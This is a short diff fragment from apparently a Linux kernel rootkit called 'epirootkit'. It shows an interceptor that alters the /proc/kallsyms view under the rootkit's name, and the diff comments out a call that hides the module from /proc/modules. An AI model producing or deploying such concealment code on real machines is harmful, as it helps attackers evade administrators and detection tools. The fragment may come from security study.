@@ -24,10 +24,7 @@ int init_interceptor(void) {
     add_modified_file("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
 
     // Hide module in /proc/modules
-    hide_module();
-
-    // Add thread hiding
-    // ...
+    // hide_module();
 
     return SUCCESS;
 }
